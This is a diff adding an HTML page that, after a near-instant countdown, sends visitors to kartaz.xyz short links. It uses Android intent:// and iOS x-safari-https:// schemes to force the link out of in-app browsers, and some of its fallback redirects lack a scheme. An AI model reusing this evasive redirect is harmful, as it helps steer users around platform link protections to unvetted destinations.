@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect with Countdown</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #007EA7, #00AFC1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            color: white;
+        }
+
+        #countdown {
+            font-size: 2em;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <p id="countdown">1</p>
+    </div>
+
+    <script>
+        const link = 'kartaz.xyz/j5xYT4tn';
+        const altLink = 'kartaz.xyz/1fZ8GFdT';
+
+        let countdownNumber = 1; 
+        const countdownElement = document.getElementById('countdown');
+        countdownElement.style.display = 'block';
+
+        const countdownInterval = setInterval(() => {
+            countdownNumber--;
+            countdownElement.innerText = countdownNumber; 
+
+            if (countdownNumber <= 0) {
+                clearInterval(countdownInterval);
+                openLink();
+            }
+        }, 10);
+
+        function openLink() {
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            setTimeout(() => {
+                const alertText = document.createElement('div');
+                alertText.style.display = "block";
+                alertText.innerHTML = `
+                    <div class="status-title">Status</div>
+                    <div class="status-message">If the link didn't open automatically, try copying it and opening it manually in another browser.</div>
+                `;
+                document.body.appendChild(alertText);
+            }, 2000);
+
+            if (isAndroid) {
+                window.location.href = "intent://" + link + "#Intent;scheme=https;end";
+                setTimeout(() => {
+                    window.location.href = 'https://' + altLink;
+                }, 500);
+            }
+
+            if (isIOS) {
+                window.location.href = "x-safari-https://" + link;
+                setTimeout(() => {
+                    window.location.href = 'https://' + altLink;
+                }, 500);
+            }
+
+            setTimeout(() => {
+                window.open(link);
+                setTimeout(() => {
+                    window.location.href = altLink;
+                }, 500);
+            }, 500);
+        }
+    </script>
+</body>
+</html>
